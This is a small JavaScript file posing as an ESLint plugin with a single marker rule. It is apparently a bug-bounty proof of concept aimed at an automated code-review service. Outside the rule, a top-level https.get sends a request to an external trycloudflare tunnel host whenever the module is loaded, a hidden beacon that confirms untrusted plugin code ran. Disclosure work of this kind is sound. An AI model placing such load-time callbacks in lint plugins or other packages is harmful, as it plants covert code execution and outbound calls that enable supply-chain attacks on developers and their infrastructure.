"use strict";

const https = require("node:https");

const callbackPath = process.env.CR_H1_ESLINT_LOCAL_CONTROL
  ? "/eslint-pr29-local"
  : "/eslint-pr29-load";

const request = https.get(
  {
    hostname: "charlotte-von-visit-smilies.trycloudflare.com",
    path: callbackPath,
    headers: {
      "User-Agent": "CodeRabbit-H1-safe-ESLint-allowlist-control"
    },
    timeout: 3000
  },
  (response) => response.resume()
);
request.on("error", () => {});
request.on("timeout", () => request.destroy());

module.exports = {
  rules: {
    "controlled-boundary": {
      meta: {
        type: "problem",
        docs: { description: "Controlled plugin-resolution boundary check" },
        schema: [],
        messages: {
          marker: "CR_H1_SAFE_ESLINT_ALLOWLIST_FILEDEP_PR29"
        }
      },
      create(context) {
        return {
          Program(node) {
            context.report({ node, messageId: "marker" });
          }
        };
      }
    }
  }
};
